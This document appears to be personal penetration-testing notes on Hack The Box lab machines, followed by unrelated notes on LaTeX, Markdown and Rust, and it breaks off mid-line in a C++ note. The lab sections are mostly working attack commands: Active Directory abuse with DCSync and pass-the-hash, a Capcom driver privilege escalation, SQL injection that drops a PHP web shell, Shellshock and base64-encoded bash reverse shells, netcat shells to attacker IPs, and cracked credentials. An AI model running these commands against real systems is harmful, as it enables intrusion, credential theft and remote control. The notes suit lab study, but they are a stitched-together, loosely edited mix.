impacket-smbserver share . -smb2support -username df -password df ==> [victim machine] net use \\10.129.9.233\share /u:df df ==> net use /d \\10.10.14.72\share 
[Privilege escalation] ==> Use bloodhound with apt install neo4j bloodhound -y ==> neo4j console #Maybe you need to change java version to 11 ❯ sudo update-alternatives --config java ==> ❯ bloodhound &> /dev/null & ; disown ==> If you forget neo4j password do this Stop neo4j if its running edit /etc/neo4j/neo4j.conf, and uncomment dbms.security.auth_enabled=false connect to the database and run ALTER USER neo4j SET PASSWORD 'mynewpass'; :exit Stop neo4j comment out the dbms.security.auth_enabled=false start neo4jIf you forget neo4j password do this Stop neo4j if its running edit /etc/neo4j/neo4j.conf, and uncomment dbms.security.auth_enabled=false connect to the database and run ALTER USER neo4j SET PASSWORD 'mynewpass'; :exit Stop neo4j comment out the dbms.security.auth_enabled=false start neo4jIf you forget neo4j password do this Stop neo4j if its running edit /etc/neo4j/neo4j.conf, and uncomment dbms.security.auth_enabled=false connect to the database and run ALTER USER neo4j SET PASSWORD 'mynewpass'; :exit Stop neo4j comment out the dbms.security.auth_enabled=false start neo4j ==> You need a recollector for Bloodhound like SharpHound.ps1 from puckiestyle; wget it in raw and from evil-winrm upload SharpHound.ps1 ==> import-module .\SharpHound.ps1 ==> We could check for what we want cat SharpHound.ps1 | grep "Invoke-BloodHound" and PS C:\> Invoke-BloodHound -CollectionMethod All ==> download this zip and import it with upload data in bloodhound ==> 
#Abusing account operators ==> net user ajgs ajgs123$! /add /domain ==> Abusing *Exchange Windows Permissions* Group with net group "Exchange Windows Permissions" ajgs /add ==> Check it with net user ajgs ==>  Do you obtain some hash with impacket-secretsdump htb.local/ajgs@10.129.69.58 ? ==> Import powerview.ps1 and finally Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ajgs -Rights DCSync ==> impacket-secretsdump svc-alfresco:s3rvice@10.129.9.233 ==> evil-winrm -i 10.129.69.58 -u 'Administrator' -H '<HASH>' 
#As last step, we could check schtasks /query /fo TABLE and schstasks /query /tn restore /v /fo list the issue with the service
#Alternative Tool: Aclpwm (https://github.com/fox-it/aclpwn.py) ==> aclpwn -f svc-alfresco -t htb.local --domain htb.local --server 10.10.10.161)
#Alternative Tool when we obtain the hashes ==>  wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.129.9.233
#I had to run this to use secretdsump ==> *Evil-WinRM* PS C:\> Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
-=-=-=
Fuse
[+] Test scan ports ==> timeout 1 bash -c "echo '' > /dev/tcp/10.129.2.5/81" #If it is open echo $? = 0 #Check https://www.thegeekstuff.com/2011/01/tput-command-examples/
[+] smbmap -H 10.129.2.5 -u null
[+] ldapsearch -h 10.129.2.5 -x -s base namingcontexts && ldapsearch -h 10.129.2.5 -x -b "DC=fabricorp,DC=local"
[+] ❯ impacket-GetNPUsers fabricorp.local/ -no-pass -usersfile users.txt
[+] ❯ crackmapexec smb 10.129.2.5 -u users.txt -p users.txt
[+] ❯ cewl -w passwords http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers #Because I didn’t specify a --depth, it will go two links away from the root page, which should be enough to get everything I want.
[+] ❯ crackmapexec smb 10.129.2.5 -u users.txt -p passwords --continue-on-success | grep -vi "failure"
[+] ❯ crackmapexec smb 10.129.2.5 -u 'bhult' -p 'Fabricorp01' #If password needs to be changed ==> smbpasswd -r 10.129.2.5 -U 'bhult'
[+] ❯ crackmapexec smb 10.129.2.5 -u 'bhult' -p 'hola123.'
[+] ❯ rpcclient -U 'bhult%hola123.' 10.129.2.5 ==> enumprinters 
[+] ❯ cat new_users_rpc.txt | tr ':' ' ' | awk '{print $2}' | tr -d '[]' OR ❯ cat new_users_rpc.txt  | grep -oP '\[.*?\]' | grep -v "0x" | tr -d '[]'
[+] ❯ crackmapexec winrm 10.129.2.5 -u 'svc-print' -p '$fab@s3Rv1ce$1' #If pwned ...
[+] ❯ evil-winrm -i 10.129.2.5 -u 'svc-print' -p '$fab@s3Rv1ce$1'
[+] get-childitem -Path c:\users\svc-print -filter user.txt -recurse -erroraction silentlycontinue -force OR get-childitem -path c:\Users -filter user.txt -recurse -erroraction silentlycontinue -force | %{$_.fullname}
Windows Privilege Escalation ==> whoami /priv | whoami /all ==> Exploiting SeLoadDriverPrivilege
https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/
1. Open Visual Studio 2022 ==> Console App ; Name of the project = LoadDriver ==> Paste the real code and Release | x64 | Rebuild Solution ==> Copy the LoadDriver.exe into Fuse\CompiledBinaries 
2. Download capcom.sys # A vulnerable driver ==> https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys into Fuse\CompiledBinaries
3. Change in ExploitCapcom.cpp when launch a command shell process ==>  Use applocker bypass (i.e. C:\Windows\System32\spool\drivers\color\malisimashell.exe) ==> Rebuild Solution ==> Fuse\CompiledBinaries
4. python -m http.server 9090 in machine windows
5. Create a reverse shell with msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.72 LPORT=4126 -f exe -o reverse.exe
6. Upload capcom.sys, LoadDriver.exe and ExploitCapcom.exe in c:\windows\temp BUT reverse.exe in C:\Windows\System32\spool\drivers\color 
7. C:\Windows\Temp\LoadDriver.exe System\CurrentControlSet\loquesea C:\Windows\Temp\Capcom.sys
8. C:\Windows\Temp\ExploitCapcom.exe
#https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

-=-=-=-=-=
Omni
❯ curl -s -X GET http://10.129.2.27:8080 -I #
[+] https://github.com/SafeBreach-Labs/SirepRAT ==> sudo python3 setup.py install ==> pip3 install -r requirements.txt
❯ python3 SirepRAT.py 10.129.2.27 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --vv
❯ python3 SirepRAT.py 10.129.2.27 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c ping 10.10.14.31" --v
[+] Move netcat to Windows machine ==> https://github.com/vinsworldcom/NetCat64/releases 
❯ python3 SirepRAT.py 10.129.2.27 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c certutil.exe -f -urlcache -split http://10.10.14.31/nc64.exe C:\Windows\System32\spool\drivers\color\nc64.exe" --v
❯ python3 SirepRAT.py 10.129.69.228 LaunchCommandWithOutput --return_output --cmd "powershell" --args "-c iwr -uri http://10.10.14.31/nc64.exe -OutFile C:\Windows\System32\spool\drivers\color\nc64.exe" --v
❯ python3 SirepRAT.py 10.129.69.228 LaunchCommandWithOutput --return_output --cmd "powershell" --args "-c C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.31 4126" --v
#Windows Privilege escalation 
[+] echo %USERNAME% ==> dir /r /s user.txt 
[+] (Import-CliXml -Path user.txt).GetNetworkCredential().password ==> icacls user.txt
[+] reg save HKLM\system system.backup ==>  reg save HKLM\sam sam.backup #If you want to list shares ==>  get-WmiObject -class Win32_Share -computer dc1.krypted.com
[+] You need to take those 2 files. In victim machine dir \\10.129.69.228\smbFolder . The best option is to use credentials. 
In victim machine ==> net use x: \\10.10.14.31\smbFolder /user:milo milo ==> In our machine impacket-smbserver share $(pwd) -smb2support -username milo -password milo
[+] Ways to see cmd history ==> doskey /history ==> F7 ==> F8 last command ==> 
[+] Clear cmd history ==> Close cmd ==> Alt + F7 
[+] dir \\10.10.14.31\smbFolder ==> copy sam.backup y:\sam ==> copy system.backup y:\system
❯ secretsdump.py  -sam sam -system system LOCAL 
❯ john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=nt
-=-=-=-=-==
#Cascade
[+] git clone https://github.com/ropnop/kerbrute ==> go build -ldflags "-s -w" ==> upx kerbrute ==> du -hc kerbrute
[+] ❯ crackmapexec smb 10.129.64.195
[+] ❯ ./kerbrute userenum --dc 10.129.64.195 -d cascade.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
[+] ❯ rpcclient -U "" 10.129.64.195 -N ==> https://github.com/s4vitar/rpcenum
[+] ❯ impacket-GetNPUsers cascade.local/ -no-pass -usersfile users.txt
[+] ❯ smbclient -L //10.129.64.195 and ❯ smbmap -H 10.129.64.195
[+] ldapsearch -x -h 10.129.64.195 -b "dc=cascade,dc=local" #We could search for usernames 
[+] ❯ ldapsearch -x -h 10.129.64.195 -b "dc=cascade,dc=local" | grep "@cascade.local" -A 20 ==> cascadeLegacyPwd: clk0bjVldmE= 
[+] ❯ crackmapexec smb 10.129.64.195 -u 'r.thompson' -p 'rY4n5eva' #Check if valid credentials
[+] ❯ rpcclient -U "" 10.129.64.195 -N -c "queryuser r.thompson"
1:24:47
[+] ❯ crackmapexec winrm 10.129.64.195 -u 'r.thompson' -p 'rY4n5eva'
[+] ❯ sudo mount -t cifs //10.129.64.195/Data /mnt/smbmounted -o username=r.thompson,password=rY4n5eva,domain=cascade.local,rw
[+] ❯ cat IT/Email\ Archives/Meeting_Notes_June_2018.html | html2text
[+] ❯ cat password | tr -d ',' | xxd -ps -r #Hexadecimal to normal output. It seems to be encrypted ==> https://github.com/jeroennijhof/vncpwd ==> make && make install ==> upx vncpwd
[+] ❯ ./vncpwd ../password
[+] ❯ crackmapexec smb 10.129.64.195 -u users.txt -p 'sT333ve2'
[+] ❯ crackmapexec winrm 10.129.64.195 -u users.txt -p 'sT333ve2'
[+] ❯ evil-winrm -i 10.129.64.195 -u 's.smith' -p 'sT333ve2'
[+] ❯ smbclient  //10.129.64.195/Audit$ -U "s.smith%sT333ve2"
[+] sqlite3 Audit.db ==> .tables
[+] dotPeek



-----------------------------------------------------------------------
LINUX

-=================================================================
#Linux
JARVIS rooms ==> -1 order by 9-- - #testing ==> -1 union select 1,2,3,4,5,6,7-- - ==> -1 union select 1,2,"test",4,5,6,7-- - ==> -1 union select 1,2,database(),4,5,6,7-- - ==> sustitute with version() / user() / load_file("/etc/passwd") #If /etc/passwd not allowed convert it to hexadecimal ❯ echo "/etc/passwd" | tr -d '\n' | xxd -ps and load_file(0xVALUE) ==> load_file("/proc/net/tcp") / proc/net/fib_trie / home/user/.ssh/id_rsa ==> -1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata-- - #If does not show all databases you could add after schemata limit 0,1 / 1,1 ==> -1 union select 1,2,table_name,4,5,6,7-- - from information_schema.tables where table_schema="hotel" limit 0,1-- - ==> Replace with ... column_name ... from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- - #In column_name we could use group_concat(column_name) ==> #For do it with CURL ❯ curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,user(),4,5,6,7-- -"  | grep price-room | html2text ===> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i : $(curl -s -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit $i,1-- -"  | grep price-room  | html2text)";done ==> ❯ for i in $(seq 0 10);do echo "[+] Para el numero $i: $(curl -s --connect-timeout 4  -G "http://10.129.227.147/room.php" --data-urlencode "cod=-1 union select 1,2,name,4,5,6,7 from room limit $i,1-- -"  | grep price-room  | html2text)";done #This is the last query =====>> If there is nothing interest, we could try using into outfile ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,%22%3C?php%20system($_REQUEST[%27cmd%27]);%20?%3E%22,4,5,6,7%20into%20outfile%20%22/var/www/html/aj.php%22--%20- ==> After that we could send us a reverse shell http://10.129.227.147/aj.php?cmd=nc%20-e%20/bin/bash%2010.10.14.33%204444 

###Another way would be using this query ==> http://10.129.227.147/room.php?cod=-2%20union%20select%201,2,group_concat(User,0x3a,Password),4,5,6,7%20from%20mysql.user--%20- ==> Crack these hash ==> hashcat --example-hashes | grep -i "sha1" ==> We have credentials DBadmin:imissyou ==> 2 ways >> 1. Check version and using searchsploit or in SQL create a query like 'SELECT "MI EJEMPLO" into outfile "/var/www/html/probando.txt" and the same way.
Privilege escalation ==> sudo -l ==> sudo -u pepper /var/www/Admin-Utilities/simpler.py ==> Test if it is correct sanitized 10.10.14.3$(echo 3) and use tcpdump -i tun0 -nc ==> Create /tmp/reverse.sh >nc -e /bin/bash 10.10.14.33 5555 ==> Once you are in find \-perm -4000 2>/dev/null ==> 

database() / schema_name from information_schema.schemata / table_name from information_schema.tables where table_schema / column_name from information_schema.columns where table_schema and table_name

-=-=-=-==
Beep
searchsploit elastix ==> Try /etc/passwd, /etc/pam.d/passwd, /etc/pam.d/system-auth, /etc/fail2ban/fail2ban.conf/, /proc/self/environ #If we have access to User Agent we could change it (burpsuite) like <?php echo "hello"; ?>  , /proc/net/fib_trie 
[+] /proc/self/status chech the Uid and Gid for compare with /etc/passwd to see whoami
[+] /proc/net/tcp > data.txt ==> cat data  | tr ':' ' '  | awk '{print $3}' | sort  -u ==> python3 0x + port in hexadecimal format --> /proc/sched_debug or /proc/schedstat #Nothing interest
[+] In https://10.129.16.160:10000/session_login.cgi?logout=1 we could try shellsock agent for cgi. ==> With burp in user agent () { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.72/4126 0>&1'
[+] Access to root directly ==> ❯ ssh root@10.129.16.160 -p 22 -oKexAlgorithms=+diffie-hellman-group-exchange-sha1
[+] Another commands ==> curl -k URL -o file #-k to ignore cert warning ==> g/nologin/d ==> grep -R return_application_language
[+] With SMTP opened we could send an email to a user ==> telnet 10.129.68.60 25 ==> EHLO loquesea.beep.htb ==> VRFY user@localhost ==> mail from:correomalisimo@quepenadas.io ==> rcpt to: asterisk@localhost ==> data ==> 
Subject: No esperes random
<?php echo system($_REQUEST['milo']); ?>
Aqui puedo poner lo que quiera ==> In Burp ==> GET /vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action&ajgs=milo HTTP/1.1
[+] Running a python script ==> Change https to http | In Burp add port 80 to bind and victim IP 443 and force SSL ==> svmap 10.129.68.60 ==> svwar --force -e 200-250 10.129.68.60 or ❯ svwar -m INVITE -e200-250 10.129.68.60 #To identify valid extensions ==> If we go to browser https://10.129.68.60/panel/ we will be able to see the panel administration ==> Change extensiono and okay

-=-=-=-=-
Knife
wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,txt-php http://10.129.216.127/FUZZ/FUZ2Z
[+] curl -s -X GET "http://10.129.216.127/" -I ==> Exploiting User-Agentt

-=-=-==
Friendzone
[+] ftp 10.129.1.225 21 #anonymous & anonymous
[+] openssl s_client -connect 10.129.1.225:443
❯ smbclient -L //10.129.1.225 -N
❯ smbmap -H 10.129.1.225
[+] smbmap -H 10.129.117.106 -R --depth 5
❯ smbmap -H 10.129.1.225  -u 'admin' -p 'WORKWORKHhallelujah@#'
❯ dig axfr @10.129.1.225 friendzoneportal.red # TCP is only used in DNS when the response size is greater than 512 bytes
sed '5,13!d' resultsdig #From line 5 to 13
❯ sed -n -e 5,6p -e 16,17p  resultsdig #If they are not in sequence
[+] cat domains | aquatone 
❯ smbclient //10.129.1.225/Development -N
[+] root@kali# cat cmd.php <?php system($_REQUEST['cmd']); ?> ==> root@kali# smbclient -N //10.10.10.123/Development -c 'put cmd.php 0xdf.php'
❯ sudo mount -t cifs //10.129.1.225/Development /mnt/montura -o username="null",password="null",domain="WORKGROUP",rw #In the script. After that umount and rm -r #https://oletange.blogspot.com/2012/04/umount-device-is-busy-why.html
[+] python3 ==> import hashlib ==> hashlib.md5("password").hexdigest() #Not works but it is interesting
[+] https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login ==> base64 -d and you see the code
Privilege escalation ==> ps -eo command #See all the commands "ejecutando"
[+] library hijacking ==> For example ==> python3 , import sys, print sys.path ==> locate os.py ==> ls -l /usr/lib | grep python2.7 ==> system("chmod 4755 /bin/bash") in os.py

-=-=-=-=-=
Ready (10.129.227.132)

https://docs.gitlab.com/ee/api/version.html
❯ curl -s -X GET http://10.129.227.132:5080/api/v4/version
❯ curl -s -X GET http://10.129.227.132:5080/api/v4/version --header "PRIVATE-TOKEN: oB2b_mq8DM9Xys39HTkx" | jq
❯ curl -s -X GET http://10.129.227.132:5080/api/v4/version --header "PRIVATE-TOKEN: oB2b_mq8DM9Xys39HTkx" | jq '.["version"]'

Or if we register in the page > Help > Version of gitlab

What can we search for?
  When was this release regarding this version?
    gitlab releases 
  Let's go search into the commits
    https://gitlab.com/gitlab-org/gitlab
  What have we found?
   Merge branch 'security-11-5-fix-webhook-ssrf-ipv6' into 'security-11-5' //This commit
   We see that there are many ways to ping the loopback.
    ❯ ping 0x7f.1

  Let's test it
    Projects > Import project > Repo by URL >
      http://127.0.0.1 //    Import url is blocked: Requests to localhost are not allowed
    Can the server connect to us?
      AM: ❯ nc -lvnp 80
          Can't grab 0.0.0.0:80 with bind : Permission denied
          ❯ sudo !!
          sudo nc -lvnp 80
      VM: http://10.10.14.12
    Can we access ports on localhost? Those are not exposed externally 
    Let's try use gopher to craft packets
      gopher://10.10.14.12:80
    With git
      git://10.10.14.12:80/test/test.git //The test.git is copied from clone with ssh
      Can we send lines when doing a connection with us?

    https://github.com/jas502n/gitlab-SSRF-redis-RCE
    
  ❯ echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.12/4545 0>&1'" | base64 -w 0;echo

  echo -n YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTIvNDU0NSAgICAwPiYxJw== | base64 -d | bash

Privilege escalation
Docker
https://github.com/stealthcopter/deepce
VM: curl 10.10.14.12:8080/deepce.sh | bash

mkdir /mnt/sda1
mount /dev/sda1 /mnt/sda1
mkdir /mnt sda2 
mount /dev/sda2 /mnt/sda2

ls /mnt///.......














-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
LaTeX 
zathura #View pdf files 
rubber #Similar to latexmk
[+]apt-get update 
[+] apt-get install texlive-full -y --fix-missing
[+] apt-get install zathura latexmk rubber -y
[+] xdg-mime query default application/pdf ==> xdg-mime default zathura.desktop application/pdf
[+] mkdir /home/ajgs/.config/latexmk ==> nvim ~/.config/latexmk/latexmkrc ==> $pdf_previewer = 'zathura';
[+] chown ajgs:ajgs -R latexmk
[+] Hacer lo mismo para root ==> cd /root ==> cd .config ==> mkdir latexmk ==> cd !$ ==> ln -s -f /home/ajgs/.config/latexmk/latexmkrc latexmkrc 
[+] latexmk -pdf -pvc Documento.tex
[+] zathura Documento.pdf > /dev/null 2>&1 &
[+] xprop WM_CLASS
[+] color #AAAAA

latexmk

-=-=-=
Markdown
[+]Images ==> The first image style is called an inline image link. To create an inline image link, enter an exclamation point ( ! ), wrap the alt text in brackets ( [ ] ), and then wrap the link in parenthesis ( ( ) ). (Alt text is a phrase or sentence that describes the image for the visually impaired.)

For example, to create an inline image link to https://octodex.github.com/images/bannekat.png, with an alt text that says, Benjamin Bannekat, you'd write this in Markdown: ![Benjamin Bannekat](https://octodex.github.com/images/bannekat.png)

For a reference image, you'll follow the same pattern as a reference link. You'll precede the Markdown with an exclamation point, then provide two brackets for the alt text, and then two more for the image tag, like this: ![The founding father][Father] At the bottom of your Markdown page, you'll define an image for the tag, like this: [Father]: http://octodex.github.com/images/founding-father.jpg.

[+] Blockquotes
To create a block quote, all you have to do is preface a line with the "greater than" caret (>).
Notice that even blank lines must contain the caret character. This ensures that the entire blockquote is grouped together.

[+] Lists ==> To create an unordered list, you'll want to preface each item in the list with an asterisk ( * ) ==> An ordered list is prefaced with numbers, instead of asterisks

[+] Paragraphs ==> 2 spaces or a new line 
[+] More tutorials ==> https://www.markdowntutorial.com/conclusion/
-=-=-=-=
Rust

Installing rustup 
$ curl --proto '=https' --tlsv1.3 https://sh.rustup.rs -sSf | sh


* First steps ==> Hello world
    > Git files won’t be generated if you run cargo new within an existing Git repository; you can override this behavior by using cargo new --vcs=git.
    > In Rust, packages of code are referred to as crates
    > cargo build => This command creates an executable file in target/debug/hello_cargo (or target\debug\hello_cargo.exe on Windows) rather than in your current directory. Because the default build is a debug build, Cargo puts the binary in a directory named debug. Running cargo build for the first time also causes Cargo to create a new file at the top level: Cargo.lock. This file keeps track of the exact versions of dependencies in your project. This project doesn’t have dependencies, so the file is a bit sparse. You won’t ever need to change this file manually; Cargo manages its contents for you.
    > cargo run => To compile the code and then run the resultant executable all in one command. Using cargo run is more convenient than having to remember to run cargo build and then use the whole path to the binary, so most developers use cargo run.
    > cargo check => This command quickly checks your code to make sure it compiles but doesn’t produce an executable. Why would you not want an executable? Often, cargo check is much faster than cargo build because it skips the step of producing an executable. If you’re continually checking your work while writing the code, using cargo check will speed up the process of letting you know if your project is still compiling! As such, many Rustaceans run cargo check periodically as they write their program to make sure it compiles. Then they run cargo build when they’re ready to use the executable
    > An additional advantage of using Cargo is that the commands are the same no matter which operating system you’re working on. 
    > When your project is finally ready for release, you can use cargo build --release to compile it with optimizations. This command will create an executable in target/release instead of target/debug. The optimizations make your Rust code run faster, but turning them on lengthens the time it takes for your program to compile. This is why there are two different profiles: one for development, when you want to rebuild quickly and often, and another for building the final program you’ll give to a user that won’t be rebuilt repeatedly and that will run as fast as possible. If you’re benchmarking your code’s running time, be sure to run cargo build --release and benchmark with the executable in target/release.

* Cargo as convention
    > Even though the hello_cargo project is simple, it now uses much of the real tooling you’ll use in the rest of your Rust career. In fact, to work on any existing projects, you can use the following commands to check out the code using Git, change to that project’s directory, and build:
    $ git clone example.org/someproject
    $ cd someproject
    $ cargo build

* Programming a guessing name
    > In Rust, variables are immutable by default, meaning once we give the variable a value, the value won’t change. To make a variable mutable, we add mut before the variable name
        let apples = 5;         // immutable
        let mut bananas = 5;    // mutable
    > The :: syntax in the ::new line indicates that new is an associated function of the String type. An associated function is a function that’s implemented on a type, in this case String. This new function creates a new, empty string. You’ll find a new function on many types because it’s a common name for a function that makes a new value of some kind.
        let mut guess = String::new();
    > The & indicates that this argument is a reference, which gives you a way to let multiple parts of your code access one piece of data without needing to copy that data into memory multiple times. References are inmutable by default.
        io::stdin()
            .read_line(&mut guess)
    > As mentioned earlier, read_line puts whatever the user enters into the string we pass to it, but it also returns a Result value. Result is an enumeration, often called an enum, which is a type that can be in one of multiple possible states. We call each possible state a variant.
        + Result’s variants are Ok and Err. The Ok variant indicates the operation was successful, and inside Ok is the successfully generated value. The Err variant means the operation failed, and Err contains information about how or why the operation failed.
        + Values of the Result type, like values of any type, have methods defined on them. An instance of Result has an expect method that you can call. If this instance of Result is an Err value, expect will cause the program to crash and display the message that you passed as an argument to expect. If the read_line method returns an Err, it would likely be the result of an error coming from the underlying operating system. If this instance of Result is an Ok value, expect will take the return value that Ok is holding and return just that value to you so you can use it. In this case, that value is the number of bytes in the user’s input.
        + If you don’t call expect, the program will compile, but you’ll get a warning

    > Cargo understands Semantic Versioning (sometimes called SemVer => http://semver.org/), which is a standard for writing version numbers. The specifier 0.8.5 is actually shorthand for ^0.8.5, which means any version that is at least 0.8.5 but below 0.9.0.

    > Next, we’re adding two lines in the middle. In the first line, we call the rand::thread_rng function that gives us the particular random number generator we’re going to use: one that is local to the current thread of execution and is seeded by the operating system. Then we call the gen_range method on the random number generator. This method is defined by the Rng trait that we brought into scope with the use rand::Rng; statement. The gen_range method takes a range expression as an argument and generates a random number in the range. The kind of range expression we’re using here takes the form start..=end and is inclusive on the lower and upper bounds, so we need to specify 1..=100 to request a number between 1 and 100.
        let secret_number = rand::thread_rng().gen_range(1..=100);

    > Note: You won’t just know which traits to use and which methods and functions to call from a crate, so each crate has documentation with instructions for using it. Another neat feature of Cargo is that running the cargo doc --open command will build documentation provided by all your dependencies locally and open it in your browser. If you’re interested in other functionality in the rand crate, for example, run cargo doc --open and click rand in the sidebar on the left.
    > First we add another use statement, bringing a type called std::cmp::Ordering into scope from the standard library. The Ordering type is another enum and has the variants Less, Greater, and Equal. These are the three outcomes that are possible when you compare two values.
    > The cmp method compares two values and can be called on anything that can be compared. It takes a reference to whatever you want to compare with: here it’s comparing guess to secret_number. Then it returns a variant of the Ordering enum we brought into scope with the use statement. We use a match expression to decide what to do next based on which variant of Ordering was returned from the call to cmp with the values in guess and secret_number.
   > Rust allows us to shadow the previous value of guess with a new one. Shadowing lets us reuse the guess variable name rather than forcing us to create two unique variables, such as guess_str and guess, for example. We’ll cover this in more detail in Chapter 3, but for now, know that this feature is often used when you want to convert a value from one type to another type. 
   > We bind this new variable to the expression guess.trim().parse(). The guess in the expression refers to the original guess variable that contained the input as a string. The trim method on a String instance will eliminate any whitespace at the beginning and end, which we must do to be able to compare the string to the u32, which can only contain numerical data. The user must press enter to satisfy read_line and input their guess, which adds a newline character to the string. For example, if the user types 5 and presses enter, guess looks like this: 5\n. The \n represents “newline.” (On Windows, pressing enter results in a carriage return and a newline, \r\n.) The trim method eliminates \n or \r\n, resulting in just 5.
   > The colon (:) after guess tells Rust we’ll annotate the variable’s type. Rust has a few built-in number types; the u32 seen here is an unsigned, 32-bit integer. It’s a good default choice for a small positive number. You’ll learn about other number types in Chapter 3. Additionally, the u32 annotation in this example program and the comparison with secret_number means Rust will infer that secret_number should be a u32 as well. So now the comparison will be between two values of the same type!
    let guess: u32 = guess.trim().parse().expect("Please type a number");
    
    > The parse method will only work on characters that can logically be converted into numbers and so can easily cause errors. If, for example, the string contained A👍%, there would be no way to convert that to a number.
    > We switch from an expect call to a match expression to move from crashing on an error to handling the error. Remember that parse returns a Result type and Result is an enum that has the variants Ok and Err. We’re using a match expression here, as we did with the Ordering result of the cmp method.
        let guess: u32 = match guess.trim().parse() {
            Ok(num) => num, 
            Err(_) => continue,
        };
    > The underscore, _, is a catchall value; in this example, we’re saying we want to match all Err values, no matter what information they have inside them. So the program will execute the second arm’s code, continue, which tells the program to go to the next iteration of the loop and ask for another guess. So, effectively, the program ignores all errors that parse might encounter!


cargo new hello_cargo
cargo build
cargo run
cargo check
cargo doc --open
target/debug directory for the executable
target/release ==> optimization
println! calls a Rust macro
let mut guess = String::new(); //String ==> type && new ==> function implemented on a type

println("x = {} and y {}", x, y);

3.1. Variables and mutability
const THREE_HOURS_IN_SECONDS: u32 = 60 * 60 * 3;
shadowing

3.2. Data types
Length	  Signed	    Unsigned
8-bit	    i8  	      u8
16-bit	  i16	        u16
32-bit	  i32,f32	    u32
64-bit	  i64,f64	    u64
128-bit	  i128	      u128
arch	    isize	      usize
4 bytes ==> ' '

Booleans are one byte in size. // let f: bool = false; 
we specify char literals with single quotes, as opposed to string literals, which use double quotes.


To explicitly handle the possibility of overflow, you can use these families of methods provided by the standard library for primitive numeric types:

    Wrap in all modes with the wrapping_* methods, such as wrapping_add
    Return the None value if there is overflow with the checked_* methods
    Return the value and a boolean indicating whether there was overflow with the overflowing_* methods
    Saturate at the value’s minimum or maximum values with saturating_* methods

Tuples
We create a tuple by writing a comma-separated list of values inside parentheses. Each position in the tuple has a type, and the types of the different values in the tuple don’t have to be the same.
fn main() {
  let tup: (i32, f64, u8) = (500, 6.4, 1);
  let (x, y, z) = tup; // Access a individual value in this single compound element
  println!("The value of y is: {}",y);
  //Accesing by the index of the value
  let x: (i32, f64, u8) = (500, 6.4, 1);
  let five_hundred = x.0;
}

Array
Unlike a tuple, every element of an array must have the same type. Unlike arrays in some other languages, arrays in Rust have a fixed length.
fn main() {
  let a: [i32; 5] = [1, 2, 3, 4, 5];
  //Accessing array elements
  let first = a[0]; //1
  //You could write
  let a = [3; 5]; //which is equal to ==> let a = [3, 3, 3, 3, 3];
}

//Example of invalid array element access 

This is an example of Rust’s memory safety principles in action. In many low-level languages, this kind of check is not done, and when you provide an incorrect index, invalid memory can be accessed. Rust protects you against this kind of error by immediately exiting instead of allowing the memory access and continuing.


-=-=
3.3. Functions
Rust doesn’t care where you define your functions, only that they’re defined somewhere in a scope that can be seen by the caller.

Statements vs expressions?
  Statements are instructions that perform some action and do not return a value. 
    Ex: let y = 6; //It is a statement
  Expressions evaluate to a resulting value.
    Do not include ending semicolons. If you add a semicolon to the end of an expression, you turn it into a statement, and it will then not return a value
    Ex: 5 + 6

3.4. Control flow

fn main() {
    let number = 6;

    if number % 4 == 0 {
        println!("number is divisible by 4");
    } else if number % 3 == 0 {
        println!("number is divisible by 3");
    } else if number % 2 == 0 {
        println!("number is divisible by 2");
    } else {
        println!("number is not divisible by 4, 3, or 2");
    }
}


Using if in a let statement
fn main() {
    let condition = true;
    let number = if condition { 5 } else { 6 };

    println!("The value of number is: {number}");
}

//Rust has three kinds of loops: loop, while and for.
loop
  break
  continue: In a loop tells the program to skip over any remaining code in this iteration of the loop and go to the next iteration.
fn main() {
    let mut counter = 0;

    let result = loop {
        counter += 1;
        if counter == 10 {
            break counter * 2;
        }
    };
    println!("The result is {}",result);
}

Loop Labels to Disambiguate Between Multiple Loops
  Loop labels must begin with a single quote. 

  fn main() {
    let mut count = 0;
    'counting_up: loop {
        println!("count = {}",count);
        let mut remaining = 10;
        

        loop {
            println!("remaining = {}",remaining);
            if remaining == 9 {
                break;
            }
            if count == 2{
                break 'counting_up;
            }
            remaining -= 1;
        }
        count += 1;
    }
    println!("End count = {}", count);
}

Looping through a collection with for
  fn main() {
    for number in (1..4).rev() {
        println!("{number}!");
    }
    println!("LIFTOFF!!!");
}












-=-=-=
Programming c++
a = a + 1; ==> is the same as ++a;
Caution 1 {
  x = 10;
